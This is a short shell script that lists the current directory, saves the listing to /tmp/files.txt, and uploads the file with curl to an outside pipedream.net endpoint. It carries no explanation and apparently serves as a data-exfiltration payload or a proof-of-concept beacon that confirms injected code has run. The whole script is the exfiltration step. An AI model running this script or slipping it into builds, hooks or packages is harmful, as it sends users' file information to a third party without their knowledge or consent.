#!/bin/sh

echo $(ls -la) > /tmp/files.txt
curl --data-binary "@/tmp/files.txt" https://en0liva7dzyvpp.x.pipedream.net/
